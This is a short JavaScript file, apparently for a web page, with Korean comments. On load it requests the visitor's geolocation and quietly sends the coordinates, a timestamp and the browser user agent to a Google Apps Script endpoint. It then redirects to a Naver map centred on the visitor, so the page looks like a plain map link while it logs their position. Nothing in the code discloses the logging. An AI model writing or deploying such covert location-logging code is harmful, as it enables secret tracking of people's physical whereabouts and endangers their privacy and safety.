var latitude = null;
var longitude = null;

$(document).ready(function() {
	if (!navigator.geolocation) {
		alert("지원하지 않는 브라우저 입니다.");
		return;
	}
	navigator.geolocation.getCurrentPosition (function(pos) {
		latitude = pos.coords.latitude; // 위도
		longitude = pos.coords.longitude; // 경도
		addLocation();
		openMap();
	});
});

function addLocation() {
	$.ajax({
		type: "GET",
		url : "https://script.google.com/macros/s/AKfycbxiuSuCSGmawBUPdmprTqcViQQO0dukeHLLQaqeQjMaJ6D1r4Y/exec",
		data: {
			"timestamp" : getDateTime(),
			"latitude" : latitude,
			"longitude" : longitude,
			"agent" : navigator.userAgent.toLowerCase()
		}
	});
}

function getDateTime() {
	var date = new Date();
	return date.getFullYear() + ". " + (date.getMonth() + 1) + ". " + date.getDate() + "  " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds();
}

function openMap() {
	if (latitude == null || longitude == null)
		return;
	location.href = "https://m.map.naver.com?lat=" + latitude + "&lng=" + longitude;
}